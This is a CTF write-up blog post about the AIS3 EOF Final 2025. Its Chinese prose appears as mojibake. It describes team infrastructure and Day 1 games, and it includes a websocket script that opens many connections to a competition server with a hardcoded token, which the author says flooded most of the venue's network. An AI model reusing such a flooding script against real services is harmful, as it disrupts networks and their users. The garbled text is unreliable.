<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTeam: CakeisTheFakeRank: 2åŒæ™‚ä¹Ÿæ‹¿äº†å€‹ç‚¸å½ˆè¶…äººçï¼Œå¾ŒçºŒæœƒè¬›ç‚ºä»€éº¼   ç¬¬äºŒå¹´æ‰“ EOFï¼Œåªèƒ½èªªæ„Ÿè¦ºèµ·ä¾†è‡ªå·±èƒ½åŠ›ç¢ºå¯¦æˆé•·ä¸å°‘ï¼Œç›¸æ¯”æ–¼å»å¹´çŸ‡æ‡‚çš„ç‹€æ…‹çœŸçš„å¥½ä¸Šè¨±å¤š XDä½†é‚„æ˜¯å¤ªèœäº†ï¼Œå¾Œé–€è¢« Ching ç¬‘ QQæ„Ÿè¬æˆ‘çš„éšŠå‹ @Flydragon @Aukro @Naup é‚„æœ‰è‡¨æ™‚æ‹‰ä¾†çš„ @Afan @Chisheng Chen ä¸€èµ·æ‰“é€™å ´ç››äº‹   è›‹ç³•çš„å‹åˆ©">
<meta property="og:type" content="article">
<meta property="og:title" content="AIS3 EOF FINAL 2025 Write Up">
<meta property="og:url" content="http://wha13.github.io/2025/02/09/eof-final-2025/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTeam: CakeisTheFakeRank: 2åŒæ™‚ä¹Ÿæ‹¿äº†å€‹ç‚¸å½ˆè¶…äººçï¼Œå¾ŒçºŒæœƒè¬›ç‚ºä»€éº¼   ç¬¬äºŒå¹´æ‰“ EOFï¼Œåªèƒ½èªªæ„Ÿè¦ºèµ·ä¾†è‡ªå·±èƒ½åŠ›ç¢ºå¯¦æˆé•·ä¸å°‘ï¼Œç›¸æ¯”æ–¼å»å¹´çŸ‡æ‡‚çš„ç‹€æ…‹çœŸçš„å¥½ä¸Šè¨±å¤š XDä½†é‚„æ˜¯å¤ªèœäº†ï¼Œå¾Œé–€è¢« Ching ç¬‘ QQæ„Ÿè¬æˆ‘çš„éšŠå‹ @Flydragon @Aukro @Naup é‚„æœ‰è‡¨æ™‚æ‹‰ä¾†çš„ @Afan @Chisheng Chen ä¸€èµ·æ‰“é€™å ´ç››äº‹   è›‹ç³•çš„å‹åˆ©">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/r1KxHhHFyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJezfiHY1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bkvq7irYkg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1khXoSKye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HklydBirK1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJDKSsSF1x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByuVwsBY1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJCLqhHKyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BySuHhHYJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HycN92SYye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyASc3HFyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S13ZqhBtkl.png">
<meta property="article:published_time" content="2025-02-09T16:51:20.000Z">
<meta property="article:modified_time" content="2025-02-09T06:00:49.652Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="CakeisTheFake">
<meta property="article:tag" content="EOF">
<meta property="article:tag" content="Franklinâ€“Reiter Attack">
<meta property="article:tag" content="PRNG">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/r1KxHhHFyg.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AIS3 EOF FINAL 2025 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/27/x3ctf-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/02/09/eof-final-2025/&text=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/02/09/eof-final-2025/&is_video=false&description=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF FINAL 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/02/09/eof-final-2025/&name=AIS3 EOF FINAL 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/02/09/eof-final-2025/&t=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infra"><span class="toc-number">2.</span> <span class="toc-text">Infra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">3.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day1-%E6%99%9A%E4%B8%8A-Day2-%E4%B8%80%E9%96%8B%E5%A7%8B%E7%9A%84-Crypto-%E4%B9%8B%E6%97%85"><span class="toc-number">4.</span> <span class="toc-text">Day1 æ™šä¸Š ~ Day2 ä¸€é–‹å§‹çš„ Crypto ä¹‹æ—…</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zkdlp"><span class="toc-number">4.1.</span> <span class="toc-text">zkdlp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prsa"><span class="toc-number">4.2.</span> <span class="toc-text">prsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AIS3 EOF FINAL 2025 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-02-09T16:51:20.000Z" class="dt-published" itemprop="datePublished">2025-02-09</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/CakeisTheFake/" rel="tag">CakeisTheFake</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/EOF/" rel="tag">EOF</a>, <a class="p-category" href="/tags/Franklin%E2%80%93Reiter-Attack/" rel="tag">Franklinâ€“Reiter Attack</a>, <a class="p-category" href="/tags/PRNG/" rel="tag">PRNG</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Team: CakeisTheFake<br>Rank: 2<br>åŒæ™‚ä¹Ÿæ‹¿äº†å€‹ç‚¸å½ˆè¶…äººçï¼Œå¾ŒçºŒæœƒè¬›ç‚ºä»€éº¼  </p>
<p>ç¬¬äºŒå¹´æ‰“ EOFï¼Œåªèƒ½èªªæ„Ÿè¦ºèµ·ä¾†è‡ªå·±èƒ½åŠ›ç¢ºå¯¦æˆé•·ä¸å°‘ï¼Œç›¸æ¯”æ–¼å»å¹´çŸ‡æ‡‚çš„ç‹€æ…‹çœŸçš„å¥½ä¸Šè¨±å¤š XD<br>ä½†é‚„æ˜¯å¤ªèœäº†ï¼Œ<del>å¾Œé–€è¢« Ching ç¬‘ QQ</del><br>æ„Ÿè¬æˆ‘çš„éšŠå‹ @Flydragon @Aukro @Naup é‚„æœ‰è‡¨æ™‚æ‹‰ä¾†çš„ @Afan @Chisheng Chen ä¸€èµ·æ‰“é€™å ´ç››äº‹  </p>
<p><img src="https://hackmd.io/_uploads/r1KxHhHFyg.png" alt="image"><br>è›‹ç³•çš„å‹åˆ©ğŸ¥³  </p>
<h2 id="Infra"><a href="#Infra" class="headerlink" title="Infra"></a>Infra</h2><p>è³½å‰æˆ‘æº–å‚™äº† Destructive Farm ç•¶ Attack Managerï¼Œä½†é–‹è³½å¾Œç™¼ç¾å¥½åƒåœŸç‚® while è¿´åœˆäº¤ flag å°±å¥½â€¦<br>å¦å¤–å°±æ˜¯é€é JumpBox ä¸»æ©Ÿè·³é€²æ¯”è³½å…§ç¶²ï¼Œé–‹ openvpn ä¸²ç¶²è·¯å‡ºå»<br>å®‰è£é€£çµå€‘<br><a target="_blank" rel="noopener" href="https://github.com/DestructiveVoice/DestructiveFarm/tree/master">Destructive Farm (LINK)</a><br><a target="_blank" rel="noopener" href="https://github.com/hwdsl2/openvpn-install/tree/master">OpenVPN (LINK)</a><br>ä½†æˆ‘é¡¯ç„¶ä¸æ˜¯ä¸€å€‹å¥½çš„è³½åšæ°´ç®¡å·¥ï¼Œæœ¬ä¾†æ²’ä»€éº¼å•é¡Œ ä½†é–‹è³½å¾Œæœ‰éšŠå‹è¦ RDP å›å®¶æ‰èƒ½é€£ VPN â€¦  </p>
<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>é€™æ¬¡çš„è³½ç¨‹å¾ˆç‰¹åˆ¥ï¼Œæœ‰ A&amp;D, KoH å’Œ Jeopardy<br>æ©ï¼Œå°ï¼Œä½ æ²’çœ‹éŒ¯ï¼Œæ±ºè³½æ‰“ Jeopardyï¼Œ<del>ç”šè‡³ä¸‰é¡Œæœ‰å…©é¡ŒCrypto</del><br>å¿«é€Ÿä»‹ç´¹ä¸€ä¸‹ä¸€é–‹å§‹å‡ºä¾†çš„å…©å€‹KoHå¥½äº†ï¼š<br>3. Bombeï¼š<br>HITCON çš„æ™‚å€™å¥§ç¾©å°±æœ‰å‡ºçš„ EDR V.S. Malware çš„ç—…æ¯’å°æ±ºï¼Œå„å€‹éšŠä¼éƒ½è¦ä¸Šè‡ªå·±çš„é˜²æ¯’ &amp; ç—…æ¯’ã€‚å…¶ä¸­ç—…æ¯’è¦å®Œæˆé–‹æª”æ¡ˆï¼Œè®€å–è¨˜æ†¶é«”å’Œé€£ç·šçš„åŠŸèƒ½ï¼›é˜²æ¯’å‰‡æ˜¯æŠ“å‡ºç—…æ¯’æª”æ¡ˆå°±å¥½<br>4. Gameï¼š<br>ä¸€æ¬¾è¿·å®®èµ°è·¯éŠæˆ²ï¼Œå¯ä»¥ç”¨<del>æœªçŸ¥</del>çš„æ–¹æ³•é–‹å¯¶ç®±ï¼Œæ”»æ“Šå°æ‰‹ç­‰ï¼Œä½†ä¸€é–‹å§‹é€£æ–¹å‘éµéƒ½æ˜¯å£çš„â€¦<br><img src="https://hackmd.io/_uploads/rJezfiHY1e.png" alt="image">  </p>
<p>5, 6, 7 éƒ½æ˜¯ Jeopardy æˆ‘å€‘è¦ºå¾—ä¸æ€¥è¿«å°±ç•™è‘—ç•¶å›å®¶ä½œæ¥­äº†  </p>
<p>ä¸€é–‹å§‹åªæœ‰ Game æ˜¯å¥½çš„ï¼Œæ‰€ä»¥æˆ‘å°±å…ˆçœ‹äº† Gameï¼Œæ‘¸ç´¢äº†ä¸€é™£éšŠå‹å€‘å¥½åƒæ²’é€†å‡ºæ±è¥¿å°±å…ˆå»çœ‹å°åŒ…äº†ï¼š<br>æœ€åˆæ˜¯æœ¬åœ°é–‹ WireSharkï¼Œä½†â€¦<del>æˆ‘å€‘å¿˜è¨˜æœ‰VPNé€™æ±è¥¿æ‰€ä»¥æµé‡è¢«åŠ å¯†é</del>ï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘æ˜¯è·³å» Jump Box éŒ„è£½<br><img src="https://hackmd.io/_uploads/Bkvq7irYkg.png" alt="image"><br>ç™»å…¥æµç¨‹æ˜¯ï¼šç™¼é€ Login è¨Šæ¯ &#x3D;&gt; Server å›å‚³ helloworld &#x3D;&gt; ç™¼é€ Login è¨Šæ¯ &#x3D;&gt; é©—è­‰<br><del>ç‚ºä»€éº¼åŒæ¨£çš„æ±è¥¿è¦ç™¼å…©æ¬¡å•Š</del><br>å…¶ä»–è³‡æ–™éƒ½å¥½å¤§å¨ï¼Œæ‰€ä»¥åš´æ ¼ä¾†èªªåªæœ‰åˆ†æåˆ°èµ°è·¯çš„å°åŒ…<br><img src="https://hackmd.io/_uploads/S1khXoSKye.png" alt="image">  </p>
<p>ä¸éå¥½æ¶ˆæ¯æ˜¯ï¼š<del>èµ°è·¯ä¹Ÿå¯ä»¥æ‹¿åˆ†æ•¸</del>ï¼Œæ–¼æ˜¯å°±é–‹å§‹äº†å…©å¤©èµ°è·¯ä¹‹æ—…~<br>æ©ï¼Œå°ï¼Œä¸€è·¯åˆ°ç¬¬äºŒå¤©æˆ‘å€‘éƒ½é‚„æ˜¯é è‘—(<del>é–‹ä¸€å¨ Process</del>)èµ°è·¯åˆ†é ˜å…ˆï¼Œä½†ä¸å°å¿ƒç‚¸äº†æœƒå ´ 90% çš„æµé‡ â€¦ (æŠ±æ­‰)<br><strong>walker.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">websocket, token</span>):</span><br><span class="line">    login_message = &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> websocket.send(json.dumps(login_message))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Login sent once&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> websocket.send(json.dumps(login_message))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Login sent twice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_move_data</span>(<span class="params">websocket, direct</span>):</span><br><span class="line">    datas = &#123;<span class="string">&#x27;u&#x27;</span>: [<span class="number">0</span>, -<span class="number">1</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">0</span>, <span class="number">1</span>], <span class="string">&#x27;r&#x27;</span>: [<span class="number">1</span>, <span class="number">0</span>], <span class="string">&#x27;l&#x27;</span>: [-<span class="number">1</span>, <span class="number">0</span>]&#125;</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> datas: </span><br><span class="line">        move_message = &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;move&quot;</span>,</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;vec&quot;</span>: [randrange(-<span class="number">1</span>, <span class="number">1</span>), randrange(-<span class="number">1</span>, <span class="number">1</span>)],</span><br><span class="line">                <span class="string">&quot;facing&quot;</span>: [randrange(-<span class="number">1</span>, <span class="number">1</span>), randrange(-<span class="number">1</span>, <span class="number">1</span>)]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(move_message))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Move message sent&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">websocket</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Raw response received: <span class="subst">&#123;response[:<span class="number">1000</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response) &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="number">0</span>] == <span class="number">0x81</span>:</span><br><span class="line">                    opcode = response[<span class="number">0</span>] &amp; <span class="number">0x0F</span></span><br><span class="line">                    length = response[<span class="number">1</span>] &amp; <span class="number">0x7F</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> length == <span class="number">0x7F</span>:</span><br><span class="line">                        length = <span class="built_in">int</span>.from_bytes(response[<span class="number">2</span>:<span class="number">10</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                        payload = response[<span class="number">10</span>:]</span><br><span class="line">                    <span class="keyword">elif</span> length == <span class="number">0x7E</span>:</span><br><span class="line">                        length = <span class="built_in">int</span>.from_bytes(response[<span class="number">2</span>:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                        payload = response[<span class="number">4</span>:]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        payload = response[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        data = payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            json_data = json.loads(data)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;JSON data received: <span class="subst">&#123;json_data&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;Non-JSON data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Failed to decode payload to UTF-8.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Received empty response.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error receiving data: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_websocket_connection</span>(<span class="params">uri, token</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri, max_size=<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        asyncio.create_task(receive_data(websocket))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> login(websocket, token)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">5000</span>):</span><br><span class="line">            <span class="keyword">await</span> send_move_data(websocket, <span class="string">&#x27;u&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Login requests completed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    uri = <span class="string">&quot;ws://10.102.100.20:8440&quot;</span></span><br><span class="line">    token = <span class="string">&quot;298956eca545bc623493bac595eb72e1&quot;</span></span><br><span class="line"></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        task = create_websocket_connection(uri, token)</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é€™å°±æ˜¯æˆ‘å€‘å¾—ç‰¹åˆ¥ççš„ç†ç”± (ç´«è‰²æ˜¯æˆ‘å€‘çš„æµé‡ğŸ« )<br><img src="https://hackmd.io/_uploads/HklydBirK1e.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/SJDKSsSF1x.png" alt="image">  </p>
<p>Bmobe çš„è©±å¤§å®¶ç¬¬ä¸€å¤©éƒ½åœ¨é©æ‡‰ï¼Œç”šè‡³æœ€å²å®³çš„ EDR å°±æ˜¯åµæ¸¬æª”æ¡ˆè£æœ‰æ²’æœ‰<code>flag1</code>çš„å­—æ¨£ï¼Œè€Œç—…æ¯’å°±æ˜¯ç”¨å­—ä¸²åŠ æ³•æ··ä¸€æ··æª”æ¡ˆè€Œå·²â€¦<br>å…¶ä»–å°±æ˜¯æ”»é˜² A&amp;D çš„é¡Œç›®ç¬¬ä¸€å¤©å¾ŒçºŒä¹Ÿæœ‰ä¸Šï¼Œä¸éæ¯”è¼ƒè™§çš„æ˜¯ç•¶ä¸‹å‰ä¸‰åçœ‹ä¸åˆ°å°åŒ…  </p>
